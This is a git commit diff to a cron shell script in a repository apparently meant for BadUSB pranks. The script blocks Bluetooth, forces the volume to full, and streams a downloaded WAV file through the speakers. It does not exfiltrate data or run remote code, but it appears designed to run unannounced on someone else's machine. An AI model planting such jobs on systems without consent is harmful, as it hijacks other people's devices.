e22c1394b04587d9dd1383643b7083ac633aa5b7
cluster bright <142358852+Cluster-bright@users.noreply.github.com>
2024-10-09 11:30:00 +0200

    Update bexecute.sh

--- chronjobs/soundstage/bexecute.sh
+++ chronjobs/soundstage/bexecute.sh
@@ -3,11 +3,13 @@
 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 
 {
-    /usr/sbin/rfkill block bluetooth
+    echo "Starting script..."
+    /usr/sbin/rfkill block bluetooth || echo "Failed to block Bluetooth"
     sleep 3
-    /usr/bin/amixer -q set Master unmute
-    /usr/bin/amixer -q set Master 100%
-    /usr/bin/wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/chronjobs/soundstage/huh.wav | /usr/bin/aplay -q &
+    /usr/bin/amixer -q set Master unmute || echo "Failed to unmute"
+    /usr/bin/amixer -q set Master 100% || echo "Failed to set volume"
+    /usr/bin/wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/chronjobs/soundstage/huh.wav | /usr/bin/aplay -q || echo "Failed to play sound"
     sleep 3
-    /usr/sbin/rfkill unblock bluetooth
-} >/dev/null 2>&1
+    /usr/sbin/rfkill unblock bluetooth || echo "Failed to unblock Bluetooth"
+    echo "Script completed."
+} > ~/glogfile.log 2>&1
